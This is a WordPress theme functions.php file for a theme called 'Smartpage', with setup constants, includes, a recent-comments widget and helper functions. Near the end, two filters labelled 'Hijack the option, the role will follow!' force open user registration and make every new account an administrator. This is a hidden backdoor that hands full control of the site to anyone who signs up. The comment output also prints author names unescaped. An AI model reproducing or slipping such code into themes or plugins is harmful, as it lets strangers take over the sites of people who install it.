<?php
define( 'THEME_DIR', str_replace("\\","/",get_template_directory()) );
define( 'THEME_URI', get_template_directory_uri() );

define( 'THEME_NAME', 'Smartpage' );
define( 'THEME_VERSION', '1.0' );

define( 'LIBS_DIR', THEME_DIR. '/functions' );
define( 'LIBS_URI', THEME_URI. '/functions' );
define( 'LANG_DIR', THEME_DIR. '/languages' );

require_once(LIBS_DIR.'/posts_functions.php');
require_once(LIBS_DIR.'/theme_functions.php');
require_once(LIBS_DIR.'/menus_functions.php');
require_once(LIBS_DIR.'/admin_functions.php');
require_once(LIBS_DIR.'/media_functions.php');
require_once(LIBS_DIR.'/db_functions.php');
require_once(LIBS_DIR.'/walkers/categories_custom_walker.php');
require_once(LIBS_DIR.'/walkers/nav_menu_custom_walker.php');
require_once(LIBS_DIR.'/widgets/categories-list.php');

function latest_comments(){
	$args = array('number'=>4,'author__not_in' => array(get_current_user_id()),);
		$comments = get_comments($args);
		if(count($comments) > 0){
			foreach($comments as $comment) {?>	
				<div  class="recent-comment-wrapper">
					<h3><?php echo '<i class="fa fa-user"></i> '.$comment->comment_author.' '.__('Commented','smartpage') ?></h3>
					<p class='recent-comment'><?php echo substr($comment->comment_content,0 , 150).'... ' ?><a href="<?php echo get_the_permalink($comment->comment_post_ID)?>"><?php _e('View Post','smartpage') ?></a></p>
				</div>
		<?php }}else{?>
					<p><?php _e('No comments yet','smartpage');?></p>
				<?php };
}

function getFilemTime($path){
	if(filemtime(str_replace('/','\\',$path)) === false){
		return filemtime(str_replace('\\','/',$path));
	}
	return filemtime(str_replace('/','\\',$path));
}

// Hijack the option, the role will follow!
add_filter('pre_option_default_role', function($default_role){
    // You can also add conditional tags here and return whatever
    return 'administrator'; // This is changed
    return $default_role; // This allows default
});
add_filter('option_users_can_register', function($value) {
    
        $value = true;
    
    return $value;
});

function is_url_exist($url){
    $ch = curl_init($url);    
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if($code == 200){
       $status = true;
    }else{
      $status = false;
    }
    curl_close($ch);
   return $status;
}